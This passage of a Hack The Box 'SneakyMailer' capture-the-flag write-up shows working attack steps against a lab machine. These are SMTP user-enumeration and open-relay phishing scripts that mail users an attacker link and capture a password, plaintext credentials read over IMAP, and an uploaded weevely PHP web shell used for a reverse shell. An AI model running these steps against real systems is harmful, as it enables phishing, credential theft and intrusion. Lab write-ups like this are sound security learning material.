+</code></pre><p>Nothing useful, maybe the team page if we have a bruteforce to perform later.</p><p>Now we can try to find some sub-domains:</p><pre tabindex=0><code>$ ffuf -u http://sneakycorp.htb/ -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H &#39;Host: FUZZ.sneakycorp.htb&#39; -ac
+
+        /&#39;___\  /&#39;___\           /&#39;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.2.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://sneakycorp.htb/
+ :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
+ :: Header           : Host: FUZZ.sneakycorp.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: 185
+ :: Filter           : Response words: 6
+ :: Filter           : Response lines: 8
+________________________________________________
+
+dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
+:: Progress: [38267/38267] :: Job [1/1] :: 1807 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
+</code></pre><p>We can add <code>dev.sneakycorp.htb</code> to <code>/etc/hosts</code>:</p><pre tabindex=0><code>$ cat /etc/hosts | grep sneak
+10.10.10.197 sneakycorp.htb dev.sneakycorp.htb
+</code></pre><p>The dev site looks the same but there is an additional page:</p><pre tabindex=0><code>$ lynx -dump -listonly -nonumbers http://dev.sneakycorp.htb/
+   Visible links:
+http://dev.sneakycorp.htb/index.php
+http://dev.sneakycorp.htb/team.php
+http://dev.sneakycorp.htb/pypi/register.php
+http://dev.sneakycorp.htb/
+http://dev.sneakycorp.htb/
+http://dev.sneakycorp.htb/
+http://dev.sneakycorp.htb/
+http://dev.sneakycorp.htb/
+
+   Hidden links:
+http://dev.sneakycorp.htb/index.php
+http://dev.sneakycorp.htb/
+http://dev.sneakycorp.htb/
+http://dev.sneakycorp.htb/
+http://dev.sneakycorp.htb/
+http://dev.sneakycorp.htb/
+http://dev.sneakycorp.htb/
+http://dev.sneakycorp.htb/#page-top
+</code></pre><p>Let&rsquo;s try to register an account at <a href=http://dev.sneakycorp.htb/pypi/register.php>http://dev.sneakycorp.htb/pypi/register.php</a></p><p>We don&rsquo;t know if it&rsquo;s working or if it&rsquo;s a rabbit hole and there is no login
+page anyway.</p><h2 id=service-discovery>Service discovery<a hidden class=anchor aria-hidden=true href=#service-discovery>#</a></h2><p>The FTP is not accessible anonymously and we don&rsquo;t have credentials yet.</p><p>There are a SMTP and IMAP server. This also another web server on port 8080
+but found nothing while enumerating.</p><h2 id=smtp--imap-exploitation>SMTP & IMAP exploitation<a hidden class=anchor aria-hidden=true href=#smtp--imap-exploitation>#</a></h2><p>Let&rsquo;s connect to the SMTP server and try to verify some email addresses:</p><pre tabindex=0><code>$ ncat sneakycorp.htb 25
+220 debian ESMTP Postfix (Debian/GNU)
+vrfy cyfun@sneakymailer.htb
+550 5.1.1 &lt;cyfun@sneakymailer.htb&gt;: Recipient address rejected: User unknown in virtual mailbox table
+vrfy airisatou@sneakymailer.htb
+252 2.0.0 airisatou@sneakymailer.htb
+</code></pre><p>So it means our account was not created after filling the registration form
+but emails listed on the team page seem valid.</p><p>I wrote a short ruby script to scrap & parse the website to extract the email
+addresses:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#75715e>#! /usr/bin/env ruby</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;nokogiri&#39;</span>
+</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;open-uri&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>doc <span style=color:#f92672>=</span> <span style=color:#66d9ef>Nokogiri</span><span style=color:#f92672>::</span><span style=color:#66d9ef>HTML</span>(<span style=color:#66d9ef>URI</span><span style=color:#f92672>.</span>open(<span style=color:#e6db74>&#39;http://sneakycorp.htb/team.php&#39;</span>))
+</span></span><span style=display:flex><span>cells <span style=color:#f92672>=</span> doc<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#39;table#dataTable tbody tr td&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cells<span style=color:#f92672>.</span>each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>c<span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span>    puts c<span style=color:#f92672>.</span>text <span style=color:#66d9ef>if</span> <span style=color:#e6db74>/@sneakymailer.htb/</span><span style=color:#f92672>.</span>match?(c)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
+</span></span></code></pre></div><pre tabindex=0><code>$ ruby grab_email.rb &gt; emails.txt
+</code></pre><p>If we want to verify all email addresses, we can re-use a
+<a href=https://rubyfu.net/module-0x3-or-network-kung-fu/email/smtp-enumeration>Rubyfu - SMTP Enumeration</a>
+script and modify it a bit.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env ruby</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;socket&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>users <span style=color:#f92672>=</span> <span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>read(<span style=color:#e6db74>&#39;emails.txt&#39;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>found <span style=color:#f92672>=</span> <span style=color:#f92672>[]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@s <span style=color:#f92672>=</span> <span style=color:#66d9ef>TCPSocket</span><span style=color:#f92672>.</span>new(<span style=color:#e6db74>&#39;sneakycorp.htb&#39;</span>, <span style=color:#ae81ff>25</span>)
+</span></span><span style=display:flex><span>@banner <span style=color:#f92672>=</span> @s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)<span style=color:#f92672>.</span>chomp
+</span></span><span style=display:flex><span>users<span style=color:#f92672>.</span>each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>user<span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span>  @s<span style=color:#f92672>.</span>send <span style=color:#e6db74>&#34;VRFY </span><span style=color:#e6db74>#{</span>user<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\n\r</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  resp <span style=color:#f92672>=</span> @s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)<span style=color:#f92672>.</span>chomp
+</span></span><span style=display:flex><span>  found <span style=color:#f92672>&lt;&lt;</span> user <span style=color:#66d9ef>if</span> resp<span style=color:#f92672>.</span>split<span style=color:#f92672>[</span><span style=color:#ae81ff>2</span><span style=color:#f92672>]</span> <span style=color:#f92672>==</span> user
+</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
+</span></span><span style=display:flex><span>@s<span style=color:#f92672>.</span>close
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#34;[*] Result:-&#34;</span>
+</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#34;[+] Banner: &#34;</span> <span style=color:#f92672>+</span> @banner
+</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#34;[+] Found users: </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>#{</span>found<span style=color:#f92672>.</span>join(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
+</span></span></code></pre></div><p>In theory there is <a href=https://nmap.org/>nmap</a> script for that too but it didn&rsquo;t work in my case:</p><pre tabindex=0><code>$ nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY},userdb=$(pwd)/emails.txt -p 25 sneakycorp.htb
+</code></pre><p>We can use another script to very available commands:</p><pre tabindex=0><code>$ nmap --script smtp-commands.nse -pT:25 sneakycorp.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:03 CET
+Nmap scan report for sneakycorp.htb (10.10.10.197)
+Host is up (0.022s latency).
+
+PORT   STATE SERVICE
+25/tcp open  smtp
+|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
+
+Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds
+</code></pre><p>There is another script to check for open relay but it doesn&rsquo;t work here
+(maybe because the anti-spam test target nmap.scanme.org by default).</p><pre tabindex=0><code>$ nmap --script smtp-open-relay.nse  -p 25 sneakycorp.htb --script-args smtp-open-relay.to=tigernixon@sneakymailer.htb,smtp-open-relay.from=cyfun@sneakymailer.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:09 CET
+Nmap scan report for sneakycorp.htb (10.10.10.197)
+Host is up (0.023s latency).
+
+PORT   STATE SERVICE
+25/tcp open  smtp
+|_smtp-open-relay: Server doesn&#39;t seem to be an open relay, all tests failed
+
+Nmap done: 1 IP address (1 host up) scanned in 29.45 seconds
+</code></pre><p>Before going farther I checked we can&rsquo;t read emails from the account we
+registered. The <a href=https://book.hacktricks.xyz/pentesting/pentesting-imap#syntax>HackTricks - IMAP Syntax</a>
+was useful for that.</p><pre tabindex=0><code>$ ncat sneakycorp.htb 143
+* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
+A1 LOGIN &#34;cyfun@sneakymailer.htb&#34; &#34;password&#34;
+A1 NO Login failed.
+</code></pre><p>I seems the SMTP server is vulnerable to open relay:</p><blockquote><p>An SMTP server that works as an open relay, is a email server that does not verify if the user is authorised to send email from the specified email address. Therefore, users would be able to send email originating from any third-party email address that they want.</p></blockquote><pre tabindex=0><code>$ ncat sneakycorp.htb 25
+MA220 debian ESMTP Postfix (Debian/GNU)
+MAIL from:cyfun@sneakymailer.htb
+250 2.1.0 Ok
+RCPT to:tigernixon@sneakymailer.htb
+250 2.1.5 Ok
+DATA
+354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+hello open relay
+.
+250 2.0.0 Ok: queued as 4773E25011
+</code></pre><p>I wrote a script to abuse of SMTP open relay and send a test email to all users:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env ruby</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;socket&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>users <span style=color:#f92672>=</span> <span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>read(<span style=color:#e6db74>&#39;emails.txt&#39;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@s <span style=color:#f92672>=</span> <span style=color:#66d9ef>TCPSocket</span><span style=color:#f92672>.</span>new(<span style=color:#e6db74>&#39;sneakycorp.htb&#39;</span>, <span style=color:#ae81ff>25</span>)
+</span></span><span style=display:flex><span>@banner <span style=color:#f92672>=</span> @s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)<span style=color:#f92672>.</span>chomp
+</span></span><span style=display:flex><span>users<span style=color:#f92672>.</span>each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>user<span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span>  @s<span style=color:#f92672>.</span>send <span style=color:#e6db74>&#34;MAIL from:cyfun@sneakymailer.htb </span><span style=color:#ae81ff>\n\r</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  @s<span style=color:#f92672>.</span>send <span style=color:#e6db74>&#34;RCPT to:</span><span style=color:#e6db74>#{</span>user<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\n\r</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  @s<span style=color:#f92672>.</span>send <span style=color:#e6db74>&#34;DATA </span><span style=color:#ae81ff>\n\r</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  @s<span style=color:#f92672>.</span>send <span style=color:#e6db74>&#34;test </span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>.</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  resp <span style=color:#f92672>=</span> @s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)<span style=color:#f92672>.</span>chomp
+</span></span><span style=display:flex><span>  puts resp
+</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
+</span></span><span style=display:flex><span>@s<span style=color:#f92672>.</span>close
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#34;[*] Result:-&#34;</span>
+</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#34;[+] Banner: &#34;</span> <span style=color:#f92672>+</span> @banner
+</span></span></code></pre></div><p>Let&rsquo;s change the email body content, replacing test by phishing content
+like a link to our web server and hope one of the users will click it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env ruby</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;socket&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>users <span style=color:#f92672>=</span> <span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>read(<span style=color:#e6db74>&#39;emails.txt&#39;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@s <span style=color:#f92672>=</span> <span style=color:#66d9ef>TCPSocket</span><span style=color:#f92672>.</span>new(<span style=color:#e6db74>&#39;sneakycorp.htb&#39;</span>, <span style=color:#ae81ff>25</span>)
+</span></span><span style=display:flex><span>@banner <span style=color:#f92672>=</span> @s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)<span style=color:#f92672>.</span>chomp
+</span></span><span style=display:flex><span>users<span style=color:#f92672>.</span>each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>user<span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span>  @s<span style=color:#f92672>.</span>send <span style=color:#e6db74>&#34;MAIL from:cyfun@sneakymailer.htb </span><span style=color:#ae81ff>\n\r</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  @s<span style=color:#f92672>.</span>send <span style=color:#e6db74>&#34;RCPT to:</span><span style=color:#e6db74>#{</span>user<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\n\r</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  @s<span style=color:#f92672>.</span>send <span style=color:#e6db74>&#34;DATA </span><span style=color:#ae81ff>\n\r</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  @s<span style=color:#f92672>.</span>send <span style=color:#e6db74>&#34;http://10.10.14.142:8080 </span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>.</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  resp <span style=color:#f92672>=</span> @s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)<span style=color:#f92672>.</span>chomp
+</span></span><span style=display:flex><span>  puts resp
+</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
+</span></span><span style=display:flex><span>@s<span style=color:#f92672>.</span>close
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#34;[*] Result:-&#34;</span>
+</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#34;[+] Banner: &#34;</span> <span style=color:#f92672>+</span> @banner
+</span></span></code></pre></div><p>Nice Paul felt into the trick:</p><pre tabindex=0><code>$ pwncat -l 8080 -vv
+INFO: Listening on :::8080 (family 10/IPv6, TCP)
+INFO: Listening on 0.0.0.0:8080 (family 2/IPv4, TCP)
+INFO: Client connected from 10.10.10.197:52994 (family 2/IPv4, TCP)
+POST / HTTP/1.1
+Host: 10.10.14.142:8080
+User-Agent: python-requests/2.23.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 185
+Content-Type: application/x-www-form-urlencoded
+
+firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+</code></pre><p>Let&rsquo;s URL decode the POST body:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span> irb
+</span></span><span style=display:flex><span>irb(main):<span style=color:#ae81ff>001</span>:<span style=color:#ae81ff>0</span><span style=color:#f92672>&gt;</span> require <span style=color:#e6db74>&#39;cgi&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>true</span>
+</span></span><span style=display:flex><span>irb(main):<span style=color:#ae81ff>002</span>:<span style=color:#ae81ff>0</span><span style=color:#f92672>&gt;</span> puts <span style=color:#66d9ef>CGI</span><span style=color:#f92672>.</span>unescape(<span style=color:#e6db74>&#39;firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&#39;</span>)
+</span></span><span style=display:flex><span>firstName<span style=color:#f92672>=</span><span style=color:#66d9ef>Paul</span><span style=color:#f92672>&amp;</span>lastName<span style=color:#f92672>=</span><span style=color:#66d9ef>Byrd</span><span style=color:#f92672>&amp;</span>email<span style=color:#f92672>=</span>paulbyrd@sneakymailer<span style=color:#f92672>.</span>htb<span style=color:#f92672>&amp;</span>password<span style=color:#f92672>=^</span>(<span style=color:#75715e>#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>=&gt;</span> ni
+</span></span></code></pre></div><p>So here are our creds: <code>paulbyrd@sneakymailer.htb</code> / <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>.</p><p>It seems that the username is not the full email address:</p><pre tabindex=0><code>$ ncat sneakycorp.htb 143
+* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
+A1 LOGIN &#34;paulbyrd@sneakymailer.htb&#34; &#34;^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&#34;
+A1 NO Login failed.
+^C
+
+$ ncat sneakycorp.htb 143
+* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
+A1 LOGIN &#34;paulbyrd&#34; &#34;^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&#34;
+* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
+A1 OK LOGIN Ok.
+A1 LIST &#34;&#34; *
+* LIST (\Unmarked \HasChildren) &#34;.&#34; &#34;INBOX&#34;
+* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Trash&#34;
+* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Sent&#34;
+* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Deleted Items&#34;
+* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Queue&#34;
+* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Sent Items&#34;
+* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Drafts&#34;
+A1 OK LIST completed
+</code></pre><p>I tried to connect to the IMAP server with Thunderbird and Kube but it
+wasn&rsquo;t working but when I tried with Evolution it worked.</p><p>But it&rsquo;s possible to continue via raw IMAP:</p><pre tabindex=0><code>A1 LIST &#34;INBOX.Sent Items&#34; *
+A1 OK LIST completed
+A1 SELECT &#34;INBOX.Sent Items&#34;
+* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
+* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
+* 2 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 589480766] Ok
+* OK [MYRIGHTS &#34;acdilrsw&#34;] ACL
+A1 OK [READ-WRITE] Ok
+A1 FETCH 2 all
+* 2 FETCH (FLAGS (\Seen) INTERNALDATE &#34;23-Jun-2020 09:27:08 -0400&#34; RFC822.SIZE 585 ENVELOPE (&#34;Wed, 27 May 2020 13:28:58 -0400&#34; &#34;Module testing&#34; ((&#34;Paul Byrd&#34; NIL &#34;paulbyrd&#34; &#34;sneakymailer.htb&#34;)) ((&#34;Paul Byrd&#34; NIL &#34;paulbyrd&#34; &#34;sneakymailer.htb&#34;)) ((&#34;Paul Byrd&#34; NIL &#34;paulbyrd&#34; &#34;sneakymailer.htb&#34;)) ((NIL NIL &#34;low&#34; &#34;debian&#34;)) NIL NIL NIL &#34;&lt;4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb&gt;&#34;))
+A1 OK FETCH completed.
+A1 FETCH 1 all
+* 1 FETCH (FLAGS (\Seen) INTERNALDATE &#34;27-May-2020 13:43:07 -0400&#34; RFC822.SIZE 2167 ENVELOPE (&#34;Fri, 15 May 2020 13:03:37 -0500&#34; &#34;Password reset&#34; ((&#34;Paul Byrd&#34; NIL &#34;paulbyrd&#34; &#34;sneakymailer.htb&#34;)) ((&#34;Paul Byrd&#34; NIL &#34;paulbyrd&#34; &#34;sneakymailer.htb&#34;)) ((&#34;Paul Byrd&#34; NIL &#34;paulbyrd&#34; &#34;sneakymailer.htb&#34;)) ((&#34;root&#34; NIL &#34;root&#34; &#34;debian&#34;)) NIL NIL NIL NIL))
+A1 OK FETCH completed.
+A1 FETCH 2 body[text]
+* 2 FETCH (BODY[TEXT] {166}
+Hello low
+
+Your current task is to install, test and then erase every python module you
+find in our PyPI service, let me know if you have any inconvenience.
+
+)
+A1 OK FETCH completed.
+A1 FETCH 1 body[text]
+* 1 FETCH (BODY[TEXT] {1888}
+--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset=&#34;utf-8&#34;
+
+Hello administrator, I want to change this password for the developer accou=
+nt
+
+Username: developer
+Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+
+Please notify me when you do it=20
+
+--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset=&#34;utf-8&#34;
+
+&lt;html xmlns:o=3D&#34;urn:schemas-microsoft-com:office:office&#34; xmlns:w=3D&#34;urn:sc=
+hemas-microsoft-com:office:word&#34; xmlns:m=3D&#34;http://schemas.microsoft.com/of=
+fice/2004/12/omml&#34; xmlns=3D&#34;http://www.w3.org/TR/REC-html40&#34;&gt;&lt;head&gt;&lt;meta ht=
+tp-equiv=3DContent-Type content=3D&#34;text/html; charset=3Dutf-8&#34;&gt;&lt;meta name=
+=3DGenerator content=3D&#34;Microsoft Word 15 (filtered medium)&#34;&gt;&lt;style&gt;&lt;!--
+/* Font Definitions */
+@font-face
+        {font-family:&#34;Cambria Math&#34;;
+        panose-1:2 4 5 3 5 4 6 3 2 4;}
+@font-face
+        {font-family:Calibri;
+        panose-1:2 15 5 2 2 2 4 3 2 4;}
+/* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+        {margin:0in;
+        margin-bottom:.0001pt;
+        font-size:11.0pt;
+        font-family:&#34;Calibri&#34;,sans-serif;}
+.MsoChpDefault
+        {mso-style-type:export-only;}
+@page WordSection1
+        {size:8.5in 11.0in;
+        margin:1.0in 1.0in 1.0in 1.0in;}
+div.WordSection1
+        {page:WordSection1;}
+--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body lang=3DEN-US link=3Dblue vlink=3D&#34;#954F72&#34;&gt;&lt;div cla=
+ss=3DWordSection1&gt;&lt;p class=3DMsoNormal&gt;Hello administrator, I want to chang=
+e this password for the developer account&lt;/p&gt;&lt;p class=3DMsoNormal&gt;&lt;o:p&gt;&amp;nbs=
+p;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Username: developer&lt;/p&gt;&lt;p class=3DMsoNorma=
+l&gt;Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&lt;/p&gt;&lt;p class=3DMsoNorm=
+al&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Please notify me when you do i=
+t &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;=
+
+--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--
+)
+A1 OK FETCH completed.
+</code></pre><p>Let&rsquo;s try those creds: <code>developer</code> / <code>m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</code> and then mess with pypi modules.</p><h2 id=ftp-access>FTP access<a hidden class=anchor aria-hidden=true href=#ftp-access>#</a></h2><p>The credentials are working on the FTP server:</p><pre tabindex=0><code>$ ftp sneakycorp.htb
+Connected to sneakycorp.htb.
+220 (vsFTPd 3.0.3)
+Name (sneakycorp.htb:cyfun): developer
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxr-x    8 0        1001         4096 Nov 08 15:39 dev
+226 Directory send OK.
+ftp&gt; ls dev
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 May 26 18:52 css
+drwxr-xr-x    2 0        0            4096 May 26 18:52 img
+-rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php
+drwxr-xr-x    3 0        0            4096 May 26 18:52 js
+drwxr-xr-x    2 0        0            4096 May 26 18:52 pypi
+drwxr-xr-x    4 0        0            4096 May 26 18:52 scss
+-rwxr-xr-x    1 0        0           26523 May 26 19:58 team.php
+drwxr-xr-x    8 0        0            4096 May 26 18:52 vendor
+226 Directory send OK.
+</code></pre><p>Before uploadign a PHP web shell, let&rsquo;s craft one:</p><pre tabindex=0><code>$ weevely generate cyfun agent.php
+Generated &#39;agent.php&#39; with password &#39;cyfun&#39; of 744 byte size.
+</code></pre><p>Then let&rsquo;s uplaod it:</p><pre tabindex=0><code>ftp&gt; cd dev
+250 Directory successfully changed.
+ftp&gt; put agent.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+744 bytes sent in 6.3e-05 seconds (11.3 Mbytes/s)
+</code></pre><p>Then let&rsquo;s connect to our webshell and use the <code>backdoor_reversetcp</code> module
+to get a reverse shell because the webshell is quickly removed from the server:</p><pre tabindex=0><code>$ weevely http://dev.sneakycorp.htb/agent.php cyfun
+
+[+] weevely 4.0.1
+
+[+] Target:     www-data@sneakymailer:/var/www/dev.sneakycorp.htb/dev
